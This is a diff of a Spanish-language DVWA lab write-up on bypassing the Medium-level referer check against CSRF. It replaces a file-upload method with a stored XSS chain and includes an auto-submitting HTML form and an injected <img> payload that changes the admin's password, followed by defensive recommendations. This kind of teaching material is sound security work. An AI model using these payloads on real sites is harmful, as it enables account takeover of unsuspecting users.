@@ -58,25 +58,22 @@ GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Chan
 ## 🔧 Nivel Medium
 
 ### 🧪 Vulnerabilidad detectada
-- El servidor verifica el **referer** o el origen de la petición.
-- Una petición externa directa no funciona, pero se puede subir el exploit usando otra vulnerabilidad.
+- El código `medium.php` realiza una validación del `HTTP_REFERER`, exigiendo que el origen de la petición sea el mismo dominio que el del servidor `SERVER_NAME`.
+- Esto impide que ataques externos funcionen directamente, pero se puede **bypassear usando una vulnerabilidad de tipo XSS almacenado**.
 
-### 🛠 Paso a paso (CSRF + File Upload)
+### 🛠 Paso a paso (XSS + CSRF combinados)
 
-1. Cambiar el archivo `csrf.html` a `csrf.php`.
-2. Establecer el nivel de seguridad en **Low** temporalmente.
-3. Ir a la sección **File Upload** de DVWA.
-4. Subir el archivo `csrf.php` al servidor.
+1. Creamos el archivo `exploit.html` con el siguiente contenido:
 
 ```html
 <html>
   <body>
-    <script>history.pushState('', '', '/')</script>
     <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
-      <input type="hidden" name="password_new" value="mediumpass" />
-      <input type="hidden" name="password_conf" value="mediumpass" />
-      <input type="hidden" name="Change" value="Change" />
-      <input type="submit" value="Submit request" />
+      New password:<br />
+      <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="test" /><br />
+      Confirm new password:<br />
+      <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="test" /><br />
+      <input type="hidden" value="Change" name="Change" />
     </form>
     <script>
       document.forms[0].submit();
@@ -85,13 +82,39 @@ GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Chan
 </html>
 ```
 
-5. Una vez subido, visitar la URL del archivo, por ejemplo:
+2. Intentamos ejecutar este exploit en el Navegador firefox.
 
-```
-http://127.0.0.1/dvwa/hackable/uploads/csrf.php
+```html
+firefox exploit.html
 ```
 
-✅ **Exploit exitoso**: al alojar el archivo en el mismo servidor, se evita el filtro del referer y se cambia la contraseña.
+Sin embargo, la salida no es la esperada, ya que no se modifica la contraseña del usuario.
+
+![Post_Exploit](assets/CSRFM_PostExploit.png)
+
+3. Ahora bajamos la seguridad a *Low* de nuevo, accedemos al apartado **XSS (Stored)** e inspeccionamos esta página, donde aumentaremos el valor de `MaxLength` a 250 para poder introducir el siguiente código en la sección *message*:
+
+```html
+<img src="/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change">
+```
+
+![CambioMaxLength_Comando](assets/CSRFM_MaxLengthComando.png)
+
+4. El administrador, al visitar la sección del libro de visitas (`XSS Stored`), ejecutará la petición hacia la ruta CSRF. El referer será el propio DVWA, por lo tanto, **el filtro de origen en Medium no bloqueará la petición**.
+
+![Peticion_CambioPass](assets/CSRFM_PeticionCambioPass.png)
+
+En la siguiente petición vemos como la contraseña es cambiada desde la sección XSS_S.
+
+![Peticion_CambioPassv2](assets/CSRFM_CambioPass.png)
+
+5. Verifica el cambio con `Test Credentials`.
+
+![TestCredentials](assets/CSRFM_TestCredentials.png)
+
+✅ **Exploit exitoso**: el uso de XSS para forzar una petición interna permite superar el control del `HTTP_REFERER`.
+
+📌 **Nota técnica:** aunque parezca una protección, el referer es manipulable o predecible en ciertos contextos. No es una defensa efectiva por sí sola.
 
 ---
 
@@ -102,7 +125,9 @@ Para prevenir ataques CSRF:
 - Usar tokens CSRF únicos por sesión y validados en el servidor.
 - Verificar cabeceras de origen (`Origin` o `Referer`).
 - No permitir cargas de archivos ejecutables.
-- Aplicar SameSite en cookies.
+- Aplicar SameSite en cookies para restringir su envío.
+- Rechazar peticiones GET para cambios sensibles como contraseñas.
+- Separar correctamente los contextos de entrada de datos para prevenir XSS.
 
 ---
 
